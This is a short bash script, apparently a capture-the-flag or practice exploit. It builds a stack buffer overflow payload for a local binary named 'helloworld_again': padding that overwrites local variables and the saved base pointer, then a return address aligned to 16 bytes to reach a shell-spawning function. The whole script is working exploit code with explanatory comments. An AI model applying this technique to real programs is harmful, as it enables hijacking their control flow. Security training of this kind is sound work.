#!/bin/bash

if [[ -e payload_2 ]]; then
    rm payload_2
fi

# Rewrite 11 bytes for local vars
helloworld="helloworld\0"
# Rewrite 37+8=45 bytes for local vars and the frame base pointer $rbp
buf=$(printf 'a%.0s' {1..45})

# The offset for 'helloworld' is 0x40125b. However, to align the $rsp with 16 bytes after the `push $rbp` instruction, start at 0x401260.
# This is because, in the do_system() function, when executing `movaps XMMWORD PTR [rsp], xmm1`, the $rsp must be aligned to 16 bytes.
jumpto="\x60\x12\x40\x00\x00\x00\x00\x00"

echo -ne $helloworld$buf$jumpto > payload_2

cat payload_2 - | ./helloworld_again
